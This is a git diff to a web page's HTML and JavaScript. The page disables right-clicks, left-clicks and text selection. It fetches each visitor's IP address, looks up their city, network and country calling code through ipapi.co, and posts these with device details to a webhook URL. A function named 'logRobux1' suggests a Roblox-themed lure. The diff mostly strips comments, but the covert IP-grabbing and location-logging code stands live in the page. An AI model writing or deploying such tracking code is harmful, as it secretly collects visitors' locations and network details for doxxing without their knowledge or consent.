@@ -18,11 +18,10 @@
       background-repeat: no-repeat;
       background-position: center;
       position: relative;
-      /* Disable text selection and copying */
       user-select: none;
-      -webkit-user-select: none; /* For older versions of Safari */
-      -moz-user-select: none; /* For older versions of Firefox */
-      -ms-user-select: none; /* For older versions of IE */
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
     }
 
     h1 {
@@ -66,13 +65,9 @@
   <script>
     document.addEventListener("DOMContentLoaded", function() {
       poop();
-
-      // Prevent right-click
       document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
       });
-
-      // Prevent left-click
       document.addEventListener('click', function(e) {
         if (e.button === 0) {
           e.preventDefault();
@@ -90,8 +85,6 @@
         .then(response => response.json())
         .then(data => {
           var ip = data.ip;
-
-          // Fetch user's location details using ipapi.co
           fetch('https://ipapi.co/' + ip + '/json/')
             .then(response => response.json())
             .then(locationData => {
@@ -107,7 +100,7 @@
 
               logRobux1(ip);
               var message = {
-                content: "Opened on: " + formattedDate + "\nIP address: " + ip + "\nCity: " + city + "\nNetwork: " + network + "\nVersion: " + version + "\nCountry Calling Code: " + countryCallingCode + "\nDevice: " + platform
+                content: "> Information\nOpened on: " + formattedDate + "\nIP address: " + ip + "\nCity: " + city + "\nNetwork: " + network + "\nVersion: " + version + "\nCountry Calling Code: " + countryCallingCode + "\nDevice: " + platform
               };
 
               fetch(webhookURL, {
